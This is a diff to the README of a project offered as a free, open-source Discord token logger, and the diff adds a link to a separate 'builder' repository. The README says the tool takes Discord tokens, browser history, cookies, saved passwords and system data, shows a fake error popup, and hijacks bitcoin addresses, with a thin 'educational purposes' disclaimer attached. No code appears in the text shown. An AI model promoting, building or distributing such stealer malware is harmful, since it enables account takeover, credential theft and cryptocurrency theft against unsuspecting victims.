@@ -1,6 +1,8 @@
 # Discord-Info-Logger
 A free, efficient, and open-source discord token logger, that also grabs history, cookies, passwords, grabs computer data, fake error popup, and intercepts bitcoin addresses. This is purely for demonstration/educational purposes. I am not responsible for any actions you take with this project.
 
+Builder: https://github.com/LocalsGitHub/Discord-Logger-Builder
+
 ## ! DO NOT ASK ME HOW TO SET UP AS IM NOT MAKING THIS IDIOT PROOF. IF YOU DON'T UNDERSTAND HOW TO USE A PYTHON SCRIPT THEN ITS NOT MY FAULT. !
 
 <p align="center">
